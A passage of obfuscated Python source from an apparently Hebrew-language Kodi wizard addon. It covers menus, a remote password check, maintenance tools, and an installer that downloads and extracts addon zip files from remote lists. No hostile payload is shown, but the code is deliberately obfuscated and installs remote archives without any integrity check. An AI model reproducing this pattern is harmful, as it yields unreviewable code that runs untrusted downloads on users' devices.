						addFile (OOOO0OOO0OOOO00O0 ,'addoninstall',O0OOO00O0OO00OO00 ,OOOO0OO000O0000O0 ,description =OOOOO00OOOO0OO000 ,icon =O0O0000OOO0O0OOO0 ,fanart =O0OO0OOO0OO0OO000 ,themeit =THEME2 )#line:2505
					if OO0OOOOOO00O0000O <1 :#line:2506
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2507
			else :#line:2508
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2509
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2510
		else :#line:2511
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2512
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2513
			addFile ('%s'%OOOOOOOO0O0OOOOO0 ,'',themeit =THEME3 )#line:2514
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2515
	setView ('files','viewType')#line:2516
def addonInstaller (OOO0O0O00000O00OO ,O0OO00O0000OO0O0O ):#line:2518
	if not ADDONFILE =='http://':#line:2519
		OOOO0OOOOOOOO00O0 =wiz .workingURL (O0OO00O0000OO0O0O )#line:2520
		if OOOO0OOOOOOOO00O0 ==True :#line:2521
			O0O000O00000OOO0O =wiz .openURL (O0OO00O0000OO0O0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2522
			OO00O0O0OOO0000OO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO0O0O00000O00OO ).findall (O0O000O00000OOO0O )#line:2523
			if len (OO00O0O0OOO0000OO )>0 :#line:2524
				for O0O0OOO0O000O00OO ,O0OO00O0000OO0O0O ,O000OOO00OOO00OOO ,O00O00O0OO00O0OOO ,O0000000O0000OOOO ,OOO0O0O0O00O00O00 ,OOO0OO0O0O0OO0O00 ,OOO0O000O00OOO0O0 ,OO000OO00OO000OO0 in OO00O0O0OOO0000OO :#line:2525
					if os .path .exists (os .path .join (ADDONS ,OOO0O0O00000O00OO )):#line:2526
						O00O0O000OO0OO0OO =['Launch Addon','Remove Addon']#line:2527
						OOOOO0O0OOO0O000O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00O0O000OO0OO0OO )#line:2528
						if OOOOO0O0OOO0O000O ==0 :#line:2529
							wiz .ebi ('RunAddon(%s)'%OOO0O0O00000O00OO )#line:2530
							xbmc .sleep (1000 )#line:2531
							return True #line:2532
						elif OOOOO0O0OOO0O000O ==1 :#line:2533
							wiz .cleanHouse (os .path .join (ADDONS ,OOO0O0O00000O00OO ))#line:2534
							try :wiz .removeFolder (os .path .join (ADDONS ,OOO0O0O00000O00OO ))#line:2535
							except :pass #line:2536
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO0O0O00000O00OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2537
								removeAddonData (OOO0O0O00000O00OO )#line:2538
							wiz .refresh ()#line:2539
							return True #line:2540
						else :#line:2541
							return False #line:2542
					O0OO000O0OO0OO0OO =os .path .join (ADDONS ,O000OOO00OOO00OOO )#line:2543
					if not O000OOO00OOO00OOO .lower ()=='none'and not os .path .exists (O0OO000O0OO0OO0OO ):#line:2544
						wiz .log ("Repository not installed, installing it")#line:2545
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOO0O0O00000O00OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000OOO00OOO00OOO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2546
							O0O00000OO0O00OOO =wiz .parseDOM (wiz .openURL (O00O00O0OO00O0OOO ),'addon',ret ='version',attrs ={'id':O000OOO00OOO00OOO })#line:2547
							if len (O0O00000OO0O00OOO )>0 :#line:2548
								OOO0O00OO00O0O00O ='%s%s-%s.zip'%(O0000000O0000OOOO ,O000OOO00OOO00OOO ,O0O00000OO0O00OOO [0 ])#line:2549
								wiz .log (OOO0O00OO00O0O00O )#line:2550
								if KODIV >=17 :wiz .addonDatabase (O000OOO00OOO00OOO ,1 )#line:2551
								installAddon (O000OOO00OOO00OOO ,OOO0O00OO00O0O00O )#line:2552
								wiz .ebi ('UpdateAddonRepos()')#line:2553
								wiz .log ("Installing Addon from Kodi")#line:2555
								OOOO0OOO0O0O00O0O =installFromKodi (OOO0O0O00000O00OO )#line:2556
								wiz .log ("Install from Kodi: %s"%OOOO0OOO0O0O00O0O )#line:2557
								if OOOO0OOO0O0O00O0O :#line:2558
									wiz .refresh ()#line:2559
									return True #line:2560
							else :#line:2561
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O000OOO00OOO00OOO )#line:2562
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOO0O0O00000O00OO ,O000OOO00OOO00OOO ))#line:2563
					elif O000OOO00OOO00OOO .lower ()=='none':#line:2564
						wiz .log ("No repository, installing addon")#line:2565
						OO0OOOO00000O0O00 =OOO0O0O00000O00OO #line:2566
						O00OOO00O00O0OOO0 =O0OO00O0000OO0O0O #line:2567
						installAddon (OOO0O0O00000O00OO ,O0OO00O0000OO0O0O )#line:2568
						wiz .refresh ()#line:2569
						return True #line:2570
					else :#line:2571
						wiz .log ("Repository installed, installing addon")#line:2572
						OOOO0OOO0O0O00O0O =installFromKodi (OOO0O0O00000O00OO ,False )#line:2573
						if OOOO0OOO0O0O00O0O :#line:2574
							wiz .refresh ()#line:2575
							return True #line:2576
					if os .path .exists (os .path .join (ADDONS ,OOO0O0O00000O00OO )):return True #line:2577
					O0O0OO0OO00O000OO =wiz .parseDOM (wiz .openURL (O00O00O0OO00O0OOO ),'addon',ret ='version',attrs ={'id':OOO0O0O00000O00OO })#line:2578
					if len (O0O0OO0OO00O000OO )>0 :#line:2579
						O0OO00O0000OO0O0O ="%s%s-%s.zip"%(O0OO00O0000OO0O0O ,OOO0O0O00000O00OO ,O0O0OO0OO00O000OO [0 ])#line:2580
						wiz .log (str (O0OO00O0000OO0O0O ))#line:2581
						if KODIV >=17 :wiz .addonDatabase (OOO0O0O00000O00OO ,1 )#line:2582
						installAddon (OOO0O0O00000O00OO ,O0OO00O0000OO0O0O )#line:2583
						wiz .refresh ()#line:2584
					else :#line:2585
						wiz .log ("no match");return False #line:2586
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2587
		else :wiz .log ("[Addon Installer] Text File: %s"%OOOO0OOOOOOOO00O0 )#line:2588
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2589
def installFromKodi (OO00OO0OOO00O00O0 ,over =True ):#line:2591
	if over ==True :#line:2592
		xbmc .sleep (2000 )#line:2593
	wiz .ebi ('RunPlugin(plugin://%s)'%OO00OO0OOO00O00O0 )#line:2595
	if not wiz .whileWindow ('yesnodialog'):#line:2596
		return False #line:2597
	xbmc .sleep (1000 )#line:2598
	if wiz .whileWindow ('okdialog'):#line:2599
		return False #line:2600
	wiz .whileWindow ('progressdialog')#line:2601
	if os .path .exists (os .path .join (ADDONS ,OO00OO0OOO00O00O0 )):return True #line:2602
	else :return False #line:2603
def installAddon (O000O00O0000O0O0O ,OO0OO00OOO0O0O0OO ):#line:2605
	if not wiz .workingURL (OO0OO00OOO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O000O00O0000O0O0O ,COLOR2 ));return #line:2606
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2607
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O00O0000O0O0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2608
	O0O0O00OOOO000000 =OO0OO00OOO0O0O0OO .split ('/')#line:2609
	OOOOO0O0OO0OOO0O0 =os .path .join (PACKAGES ,O0O0O00OOOO000000 [-1 ])#line:2610
	try :os .remove (OOOOO0O0OO0OOO0O0 )#line:2611
	except :pass #line:2612
	downloader .download (OO0OO00OOO0O0O0OO ,OOOOO0O0OO0OOO0O0 ,DP )#line:2613
	O0OO0O0OOOO00OOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O00O0000O0O0O )#line:2614
	DP .update (0 ,O0OO0O0OOOO00OOO0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2615
	O00O00000000OO0OO ,OOOOO0OO0O00O0000 ,O0O0O0000000OO0O0 =extract .all (OOOOO0O0OO0OOO0O0 ,ADDONS ,DP ,title =O0OO0O0OOOO00OOO0 )#line:2616
	DP .update (0 ,O0OO0O0OOOO00OOO0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2617
	installed (O000O00O0000O0O0O )#line:2618
	installDep (O000O00O0000O0O0O ,DP )#line:2619
	DP .close ()#line:2620
	wiz .ebi ('UpdateAddonRepos()')#line:2621
	wiz .ebi ('UpdateLocalAddons()')#line:2622
	wiz .refresh ()#line:2623
def installDep (O0OOO000O0O00OOOO ,DP =None ):#line:2625
	OOO000O0OOOOOO00O =os .path .join (ADDONS ,O0OOO000O0O00OOOO ,'addon.xml')#line:2626
	if os .path .exists (OOO000O0OOOOOO00O ):#line:2627
		O0OO00O0O00OOO0O0 =open (OOO000O0OOOOOO00O ,mode ='r');O0O00O0OO00OOO0OO =O0OO00O0O00OOO0O0 .read ();O0OO00O0O00OOO0O0 .close ();#line:2628
		OOOO00OO000O0OO00 =wiz .parseDOM (O0O00O0OO00OOO0OO ,'import',ret ='addon')#line:2629
		for O000000O0OO0O0OO0 in OOOO00OO000O0OO00 :#line:2630
			if not 'xbmc.python'in O000000O0OO0O0OO0 :#line:2631
				if not DP ==None :#line:2632
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000000O0OO0O0OO0 ))#line:2633
				wiz .createTemp (O000000O0OO0O0OO0 )#line:2634
def installed (OOO0O000O00OOOO00 ):#line:2661
	OOOO000OOO0OOOO00 =os .path .join (ADDONS ,OOO0O000O00OOOO00 ,'addon.xml')#line:2662
	if os .path .exists (OOOO000OOO0OOOO00 ):#line:2663
		try :#line:2664
			O00000O0OOO00OO0O =open (OOOO000OOO0OOOO00 ,mode ='r');OOO0OOO0O0OO0O000 =O00000O0OOO00OO0O .read ();O00000O0OOO00OO0O .close ()#line:2665
			O00000000O00O0000 =wiz .parseDOM (OOO0OOO0O0OO0O000 ,'addon',ret ='name',attrs ={'id':OOO0O000O00OOOO00 })#line:2666
			O00OO0OOO000OOO0O =os .path .join (ADDONS ,OOO0O000O00OOOO00 ,'icon.png')#line:2667
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00000000O00O0000 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00OO0OOO000OOO0O )#line:2668
		except :pass #line:2669
def youtubeMenu (url =None ):#line:2671
	if not YOUTUBEFILE =='http://':#line:2672
		if url ==None :#line:2673
			O0000OO0O0OO0O000 =wiz .workingURL (YOUTUBEFILE )#line:2674
			OO0O000O0OOO0O000 =uservar .YOUTUBEFILE #line:2675
		else :#line:2676
			O0000OO0O0OO0O000 =wiz .workingURL (url )#line:2677
			OO0O000O0OOO0O000 =url #line:2678
		if O0000OO0O0OO0O000 ==True :#line:2679
			OO0000O00OO0OOO0O =wiz .openURL (OO0O000O0OOO0O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2680
			OO000O000O00O000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0000O00OO0OOO0O )#line:2681
			if len (OO000O000O00O000O )>0 :#line:2682
				for OOO00000OOO0O00O0 ,OO00000O00O0O0OO0 ,url ,OO0OOO00OOOO0O00O ,O00O0OOOOO0OO0OO0 ,O0OOOOOOOO0O0OOO0 in OO000O000O00O000O :#line:2683
					if OO00000O00O0O0OO0 .lower ()=="yes":#line:2684
						addDir ("[B]%s[/B]"%OOO00000OOO0O00O0 ,'youtube',url ,description =O0OOOOOOOO0O0OOO0 ,icon =OO0OOO00OOOO0O00O ,fanart =O00O0OOOOO0OO0OO0 ,themeit =THEME3 )#line:2685
					else :#line:2686
						addFile (OOO00000OOO0O00O0 ,'viewVideo',url =url ,description =O0OOOOOOOO0O0OOO0 ,icon =OO0OOO00OOOO0O00O ,fanart =O00O0OOOOO0OO0OO0 ,themeit =THEME2 )#line:2687
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2688
		else :#line:2689
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2690
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2691
			addFile ('%s'%O0000OO0O0OO0O000 ,'',themeit =THEME3 )#line:2692
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2693
	setView ('files','viewType')#line:2694
def STARTP ():#line:2695
	OOO0O0OOOOO000000 =(ADDON .getSetting ("pass"))#line:2696
	if BUILDNAME =="":#line:2697
	 if not NOTIFY =='true':#line:2698
          O0O00O00000O0OO00 =wiz .workingURL (NOTIFICATION )#line:2699
	 if not NOTIFY2 =='true':#line:2700
          O0O00O00000O0OO00 =wiz .workingURL (NOTIFICATION2 )#line:2701
	 if not NOTIFY3 =='true':#line:2702
          O0O00O00000O0OO00 =wiz .workingURL (NOTIFICATION3 )#line:2703
	OO0O0OOO0O0O0000O =OOO0O0OOOOO000000 #line:2704
	O0O00O00000O0OO00 =urllib2 .Request (SPEED )#line:2705
	OO0OOOOO00O0000OO =urllib2 .urlopen (O0O00O00000O0OO00 )#line:2706
	O0OOOOOOO0O0O00O0 =OO0OOOOO00O0000OO .readlines ()#line:2708
	O0OOO0O0O000OO000 =0 #line:2712
	for OO0000O0OOO0OO0O0 in O0OOOOOOO0O0O00O0 :#line:2713
		if OO0000O0OOO0OO0O0 .split (' ==')[0 ]==OOO0O0OOOOO000000 or OO0000O0OOO0OO0O0 .split ()[0 ]==OOO0O0OOOOO000000 :#line:2714
			O0OOO0O0O000OO000 =1 #line:2715
			break #line:2716
	if O0OOO0O0O000OO000 ==0 :#line:2717
					OOOOO000O00OO0OOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2718
					if OOOOO000O00OO0OOO :#line:2720
						ADDON .openSettings ()#line:2722
						sys .exit ()#line:2724
					else :#line:2725
						sys .exit ()#line:2726
	return 'ok'#line:2730
def STARTP2 ():#line:2731
	O0OO0O00O0O000O00 =(ADDON .getSetting ("user"))#line:2732
	O0O0000OO0O0O00O0 =(UNAME )#line:2734
	OO0OOO0OO00000O0O =urllib2 .urlopen (O0O0000OO0O0O00O0 )#line:2735
	OO0OOO0OO0OOO000O =OO0OOO0OO00000O0O .readlines ()#line:2736
	OOOO00000OOOOOOOO =0 #line:2737
	for O0O00O00OO0OOO0O0 in OO0OOO0OO0OOO000O :#line:2740
		if O0O00O00OO0OOO0O0 .split (' ==')[0 ]==O0OO0O00O0O000O00 or O0O00O00OO0OOO0O0 .split ()[0 ]==O0OO0O00O0O000O00 :#line:2741
			OOOO00000OOOOOOOO =1 #line:2742
			break #line:2743
	if OOOO00000OOOOOOOO ==0 :#line:2744
		OOO0OO0OO0O0O0000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2745
		if OOO0OO0OO0O0O0000 :#line:2747
			ADDON .openSettings ()#line:2749
			sys .exit ()#line:2752
		else :#line:2753
			sys .exit ()#line:2754
	return 'ok'#line:2758
def passandpin ():#line:2759
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2760
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2761
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2762
def passandUsername ():#line:2763
	ADDON .openSettings ()#line:2764
def folderback ():#line:2767
    O00O0OOOO0O0O00O0 =ADDON .getSetting ("path")#line:2768
    if O00O0OOOO0O0O00O0 :#line:2769
      O00O0OOOO0O0O00O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2770
      ADDON .setSetting ("path",O00O0OOOO0O0O00O0 )#line:2771
def backmyupbuild ():#line:2774
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
def maintMenu (view =None ):#line:2790
	OO00OO0O0O00O0O00 ='[B][COLOR green]ON[/COLOR][/B]';O00O0OO0OO0O0O000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2792
	OOOOO000000O0OOOO ='true'if AUTOCLEANUP =='true'else 'false'#line:2793
	O000OOO00OOOO0000 ='true'if AUTOCACHE =='true'else 'false'#line:2794
	OO0O0OO0OOO0OO00O ='true'if AUTOPACKAGES =='true'else 'false'#line:2795
	O0OO0000O0OO0OO00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2796
	OOO0O0000OOOO0OO0 ='true'if SHOWMAINT =='true'else 'false'#line:2797
	OO000O0O00O000000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2798
	O00O0OO000O0O00O0 ='true'if INCLUDEALL =='true'else 'false'#line:2799
	O00OOO000O0O00OO0 ='true'if THIRDPARTY =='true'else 'false'#line:2800
	if wiz .Grab_Log (True )==False :OO00O0O0O0OO0000O =0 #line:2801
	else :OO00O0O0O0OO0000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2802
	if wiz .Grab_Log (True ,True )==False :OOO0OO000000OOOO0 =0 #line:2803
	else :OOO0OO000000OOOO0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2804
	OO0000O0OOO0O00OO =int (OO00O0O0O0OO0000O )+int (OOO0OO000000OOOO0 )#line:2805
	O000000OO000OOOO0 =str (OO0000O0OOO0O00OO )+' Error(s) Found'if OO0000O0OOO0O00OO >0 else 'None Found'#line:2806
	O0O0OOO00O000OOO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2807
	if O00O0OO000O0O00O0 =='true':#line:2808
		O000OOOO0OOO0O0OO ='true'#line:2809
		OOOO0000000O00000 ='true'#line:2810
		O000000O00O000OOO ='true'#line:2811
		O00O0000OOO00O00O ='true'#line:2812
		O00O0OOOOO0OOO00O ='true'#line:2813
		O0000O0O00000O0OO ='true'#line:2814
		O0OOOO0000OO00000 ='true'#line:2815
		OOOO0O00OOO000OO0 ='true'#line:2816
	else :#line:2817
		O000OOOO0OOO0O0OO ='true'if INCLUDEBOB =='true'else 'false'#line:2818
		OOOO0000000O00000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2819
		O000000O00O000OOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2820
		O00O0000OOO00O00O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2821
		O00O0OOOOO0OOO00O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2822
		O0000O0O00000O0OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2823
		O0OOOO0000OO00000 ='true'if INCLUDESALTS =='true'else 'false'#line:2824
		OOOO0O00OOO000OO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2825
	O00O0OOOO0O0O00OO =wiz .getSize (PACKAGES )#line:2826
	O00O0OOOOOOOO0OO0 =wiz .getSize (THUMBS )#line:2827
	OO000O0O00OO00O00 =wiz .getCacheSize ()#line:2828
	O00OOOO0O000O0OOO =O00O0OOOO0O0O00OO +O00O0OOOOOOOO0OO0 +OO000O0O00OO00O00 #line:2829
	OOOO00000OO0O0000 =['Daily','Always','3 Days','Weekly']#line:2830
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2831
	if view =="clean"or SHOWMAINT =='true':#line:2832
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOOO0O000O0OOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000O0O00OO00O00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0OOOO0O0O00OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0OOOOOOOO0OO0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2840
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2841
	if view =="addon"or SHOWMAINT =='false':#line:2842
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="misc"or SHOWMAINT =='true':#line:2851
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('View Errors in Log: %s'%(O000000OO000OOOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Clear Wizard Log File%s'%O0O0OOO00O000OOO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2861
	if view =="backup"or SHOWMAINT =='true':#line:2862
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2875
	if view =="tweaks"or SHOWMAINT =='true':#line:2876
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2877
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		else :#line:2879
			if os .path .exists (ADVANCED ):#line:2880
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2881
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2882
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	addFile ('Show All Maintenance: %s'%OOO0O0000OOOO0OO0 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2890
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2891
	addFile ('Third Party Wizards: %s'%O00OOO000O0O00OO0 .replace ('true',OO00OO0O0O00O0O00 ).replace ('false',O00O0OO0OO0O0O000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	if O00OOO000O0O00OO0 =='true':#line:2893
		O0OO0O00O00O0OOOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2894
		O0O00OOO0OOO0O0O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2895
		OO0OO000000OO00OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2896
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO0O00O00O0OOOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00OOO0OOO0O0O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OO000000OO00OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2899
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2900
